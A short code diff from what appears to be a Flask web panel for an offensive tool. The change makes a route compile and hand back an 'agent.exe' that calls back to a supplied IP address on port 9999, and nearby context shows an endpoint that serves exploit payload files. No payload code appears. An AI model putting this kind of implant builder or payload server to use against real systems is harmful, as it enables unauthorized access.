@@ -131,13 +131,11 @@ def delete_wordlist():
 def generate_agent():
     arg = request.form.to_dict()
     ipAddr = arg['ipAddr']
-    port = int(arg['port'])
-    script_generate_agent(ipAddr, port)
-    return """
-            <script>
-                window.alert("Compile Success");
-                window.location.href = document.referrer;
-            </script>"""
+    code = script_generate_agent(ipAddr, 9999)
+    if code == 0: # success
+        return send_file('agent/agent.exe')
+    else:
+        return """<script>window.alert("Compile Failed");window.location.href = document.referrer;</script>"""
 
 @blueprint.route('/exploit/<filename>', methods=["GET"]) # endpoint for retrieving payload files 
 def return_exploit(filename):
